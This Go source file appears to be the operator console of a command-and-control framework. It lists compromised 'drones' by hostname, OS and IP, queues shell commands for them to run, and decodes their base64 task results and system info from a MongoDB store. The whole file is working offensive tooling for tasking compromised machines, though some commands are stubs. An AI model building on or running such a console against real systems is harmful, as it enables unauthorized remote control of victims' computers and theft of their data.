package main

import (
	"bufio"
	"context"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

const banner string = (`
__________ ___________ ____  ___.
\______   \\__    ___/|    |/  _|
 |    |  _/  |    |   |       <  
 |    |   \  |    |   |    |   \ 
 |_____   /  |____|   |____|__  \
       \ /                    \ /
	'   <console>	       ' `)

func main() {
	fmt.Println(banner)
	buffer := bufio.NewReader(os.Stdin)
	cursor := "$ "
	for {
		fmt.Printf(cursor)
		input, err := buffer.ReadString('\n')
		if err != nil {
			log.Println(err)
		}
		parseCLI(input)
	}
}

func parseCLI(input string) {
	input = strings.TrimSpace(input)

	switch true {

	case strings.TrimSpace(input) == "list drones":
		fmt.Println("listing all drones")
		listDrones()
		return

	case strings.HasPrefix(input, "set task"):
		getArgs := strings.Split(input, " ")
		getTask := strings.Split(input, ":")
		getVals := strings.Split(getArgs[2], ":")
		if len(getVals) != 2 {
			fmt.Println("usage: set task <host>:<task>")
			return
		}
		setTask(getVals[0], getTask[1])

	case strings.HasPrefix(input, "get details"):
		getArgs := strings.Split(input, " ")
		if len(getArgs) != 3 {
			fmt.Println("usage: get details <droneID>")
			return
		}
		fmt.Println(getArgs)

	case strings.HasPrefix(input, "get results"):
		getArgs := strings.Split(input, " ")
		if len(getArgs) != 3 {
			fmt.Println("usage: get results <droneID>")
			return
		}
		getResults(getArgs[2])

	case strings.HasPrefix(input, "clear results"):
		getArgs := strings.Split(input, " ")
		if len(getArgs) != 3 {
			fmt.Println("usage: clear results <droneID>")
		}
		clearResults(getArgs[2])

	case strings.HasPrefix(input, "delete drone"):
		getArgs := strings.Split(input, " ")
		if len(getArgs) != 3 {
			fmt.Println("usage: delete drone <droneID>")
			return
		}
		fmt.Println(getArgs)

	case strings.EqualFold(strings.TrimSpace(input), "exit"):
		os.Exit(0)

	case strings.EqualFold(strings.TrimSpace(input), "help"):
		fmt.Println(`list drones <filter>:<value> \\ list drones based on specified filter ie. "list drones os:windows"`)
		fmt.Println(`set task <droneID>:<task>    \\ set task on drone given droneID ie. "set task <md5Val>:dir /AH"`)

	}

}

func getResults(droneID string) {
	client, Drones, ctx := connectDB()
	var getResult bson.M
	if err := Drones.FindOne(ctx, bson.D{{"id", droneID}}).Decode(&getResult); err != nil {
		log.Println(err)
	}

	sep := strings.Split(getResult["tasksresult"].(string), "|")

	for _, cmd := range sep {
		fmt.Println(un64(cmd))
	}

	client.Disconnect(ctx)
}

func setTask(droneID string, task string) {
	client, Drones, ctx := connectDB()
	var setTask bson.M
	if err := Drones.FindOne(ctx, bson.D{{"id", droneID}}).Decode(&setTask); err != nil {
		log.Println(err)
	}

	opts := options.FindOneAndUpdate().SetUpsert(true)
	filter := bson.D{{"id", droneID}}
	update := bson.D{{"$set", bson.D{{"tasks", task}}}}

	var updatedTask bson.M
	updateErr := Drones.FindOneAndUpdate(ctx, filter, update, opts).Decode(&updatedTask)
	if updateErr != nil {
		if updateErr == mongo.ErrNoDocuments {
			return
		}
		log.Println(updateErr)
	}
	fmt.Printf("task: %s set for drone: %s\n", task, droneID)
	client.Disconnect(ctx)

}

func clearResults(droneID string) {
	client, Drones, ctx := connectDB()
	opts := options.FindOneAndUpdate().SetUpsert(true)
	filter := bson.D{{"id", droneID}}
	update := bson.D{{"$set", bson.D{{"tasksresult", ""}}}}

	var clearTask bson.M
	updateErr := Drones.FindOneAndUpdate(ctx, filter, update, opts).Decode(&clearTask)
	if updateErr != nil {
		if updateErr == mongo.ErrNoDocuments {
			return
		}
		log.Println(updateErr)
	}
	client.Disconnect(ctx)
}

func listDrone(filterKey string, filterVal string) {
	fmt.Println("test")
	client, Drones, ctx := connectDB()
	var getDrone bson.M
	if err := Drones.FindOne(ctx, bson.D{{filterKey, filterVal}}).Decode(&getDrone); err != nil {
		log.Println(err)
	}
	fmt.Println(getDrone["hostname"])
	fmt.Println(getDrone["tasks"])
	fmt.Println(getDrone["tasksresult"])
	fmt.Println(un64(getDrone["sysinfo"].(string)))

	client.Disconnect(ctx)

}

func listDrones() {
	client, Drones, ctx := connectDB()
	var getDrones []bson.M
	cursor, err := Drones.Find(ctx, bson.D{{}})
	if err != nil {
		log.Println(err)
	}
	if err = cursor.All(ctx, &getDrones); err != nil {
		log.Println(err)
	}
	for _, dMap := range getDrones {
		fmt.Printf("id: %s hostname: %s OS: %s IP: %s\n", dMap["id"], dMap["hostname"], dMap["os"], un64(dMap["ipinfo"].(string)))
	}
	client.Disconnect(ctx)

}

func connectDB() (client *mongo.Client, Drones *mongo.Collection, ctx context.Context) {
	client, err := mongo.NewClient(options.Client().ApplyURI("mongodb://192.168.1.112:7895"))
	if err != nil {
		log.Println(err)
	}

	ctx, _ = context.WithTimeout(context.Background(), 5*time.Second)
	err = client.Connect(ctx)
	if err != nil {
		log.Println(err)
	}

	DroneDB := client.Database("DroneDB")
	Drones = DroneDB.Collection("Drones")

	return client, Drones, ctx
}

func un64(in string) (out string) {
	data, err := base64.StdEncoding.DecodeString(in)
	if err != nil {
		log.Println(err)
	}
	return string(data)
}
